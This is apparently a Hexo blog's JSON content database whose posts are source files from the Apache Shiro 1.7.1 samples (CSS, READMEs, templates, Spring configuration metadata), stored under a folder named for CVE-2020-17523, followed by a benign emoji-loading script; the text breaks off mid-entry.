{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"张三李四是大佬，李四是大佬，李四是大佬，李四是大佬，李四是大佬李四我不是大佬，我不是大佬，我不是大佬，我不是大佬，我不是大佬王五我是小白 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata","date":"2021-03-03T08:20:22.997Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","excerpt":"","text":"{\"groups\":[{\"name\":\"shiro\"}],\"properties\":[{\"name\":\"shiro.web.enabled\",\"type\":\"java.lang.Boolean\",\"description\":\"A boolean flag that can disable all Shiro Spring Boot starters. This is mostly useful during testing or debugging, or if you want to compare behavior when Shiro is enabled or disabled.\",\"defaultValue\":true},{\"name\":\"shiro.loginUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's login URL to be assigned to all acquired Filters that subclass AccessControlFilter or 'null' if no value should be assigned globally.\",\"defaultValue\":\"/login.jsp\"},{\"name\":\"shiro.successUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's after-login success URL to be assigned to all acquired Filters that subclass AuthenticationFilter or null if no value should be assigned globally.\",\"defaultValue\":\"/\"},{\"name\":\"shiro.unauthorizedUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's 'unauthorized' URL to apply to as a convenience to all discovered AuthorizationFilter instances.\",\"defaultValue\":null},{\"name\":\"shiro.sessionManager.sessionIdCookieEnabled\",\"type\":\"java.lang.String\",\"description\":\"Enable or disable session tracking via a cookie.\",\"defaultValue\":true},{\"name\":\"shiro.sessionManager.sessionIdUrlRewritingEnabled\",\"type\":\"java.lang.String\",\"description\":\"Enable or disable session tracking via a URL parameter. If your site requires cookies, it is recommended you disable this.\",\"defaultValue\":true}]} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata","date":"2021-03-03T08:20:22.976Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","excerpt":"","text":"{\"groups\":[{\"name\":\"shiro\"}],\"properties\":[{\"name\":\"shiro.enabled\",\"type\":\"java.lang.Boolean\",\"description\":\"A boolean flag that can disable all Shiro Spring Boot starters. This is mostly useful during testing or debugging, or if you want to compare behavior when Shiro is enabled or disabled.\",\"defaultValue\":true}]} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/src/main/webapp/style","date":"2021-03-03T08:20:22.828Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/README","date":"2021-03-03T08:20:22.817Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/web/README/","excerpt":"","text":"Apache Shiro Web Example An example web application that show how to configure Shiro via a web.xml and basic user login. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring/README","date":"2021-03-03T08:20:22.807Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring/README/","excerpt":"","text":"Apache Shiro + Spring Web Example This example creates a web application (WAR packaged) to demonstrate configuring Apache Shiro via Spring. This example also includes a Spring Remoting example. Run the Example 1mvn jetty:run Browse to http://localhost:8080/shiro-samples-spring document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/src/main/webapp/shiro","date":"2021-03-03T08:20:22.805Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/src/main/webapp/shiro/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/src/main/webapp/shiro/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 1px; padding: 1px; background: #fff; font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick #ccc solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/README","date":"2021-03-03T08:20:22.777Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-mvc/README/","excerpt":"","text":"Apache Shiro + Spring Web Example This example creates a web application (WAR packaged) to demonstrate configuring Apache Shiro via Spring. This example also includes a Spring Remoting example. Run the Example 1mvn jetty:run-war Browse to http://localhost:8080/shiro-samples-spring document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/src/main/webapp/styles/sample","date":"2021-03-03T08:20:22.772Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/src/main/webapp/styles/sample/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/src/main/webapp/styles/sample/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { background: #f6f6f6} body, td, th { font-family:\"Lucida Grande\",\"Lucida Sans Unicode\",Arial,Verdana,sans-serif; color: #333; font-size: 12px; } #box { width: 500px; } #bigbox { width: 940px; } #bigbox, #box { margin: 30px; padding: 0; border: thin black solid; background: #fff} #bigbox .title, #box .title { display: block; margin: 0 0 5px 0; padding: 5px 5px 5px 15px; background: #ddd; font-size: 18px} #bigbox .title .info { float: right; padding-right: 10px; font-size: 12px} .errors { color: red; padding: 10px 0 10px 0; } .form-label { float: left; width: 100px;} .content { padding: 10px;} .content div { padding: 5px 0 5px 0 } #manageUsers { width: 800px } #manageUsers th { text-align: left } a:active, a:visited, a:link { color: #6666DD; text-decoration: none; } a:hover { color: #6666FF; text-decoration: underline; } .clearfix:after {content:\".\";display:block;height:0;clear:both;visibility:hidden;} .clearfix {display:inline-block;} * html .clearfix {height:1%;} .clearfix {display:block;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/README","date":"2021-03-03T08:20:22.731Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-hibernate/README/","excerpt":"","text":"Apache Shiro + Spring Web + Hibernate Example A Spring Boot example web application that show the usage of a user login with Spring and Hibernate. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot/README","date":"2021-03-03T08:20:22.719Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot/README/","excerpt":"","text":"Apache Shiro + Spring CLI Example A Spring Boot example CLI application that show the usage of a user login, checking permissions, and annotation protected methods. Run the Example 1mvn spring-boot:run document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/login","date":"2021-03-03T08:20:22.718Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/login/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/login/","excerpt":"","text":"Here are a few sample accounts to play with from the text-based Realm Username Password Roles joe.coder password user jill.coder password admin Login document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/hello","date":"2021-03-03T08:20:22.717Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/hello/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/hello/","excerpt":"","text":"Login Account info&nbsp;(Requires 'admin' role.) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/fragments/head","date":"2021-03-03T08:20:22.715Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/fragments/head/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/fragments/head/","excerpt":"","text":"Nothing to see here, move along. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/error","date":"2021-03-03T08:20:22.714Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/error/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/error/","excerpt":"","text":"Unauthorized Go Home document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/account-info","date":"2021-03-03T08:20:22.713Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/account-info/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/src/main/resources/templates/account-info/","excerpt":"","text":"Home document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/README","date":"2021-03-03T08:20:22.700Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/spring-boot-web/README/","excerpt":"","text":"Apache Shiro + Spring Web Example A Spring Boot example web application that show the usage of a user login, checking permissions, and annotation protected methods. Run the Example 1mvn spring-boot:run Browse to http://localhost:8080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/servlet-plugin/src/main/webapp/style","date":"2021-03-03T08:20:22.318Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/servlet-plugin/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/servlet-plugin/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/src/main/webapp/style","date":"2021-03-03T08:20:22.274Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * 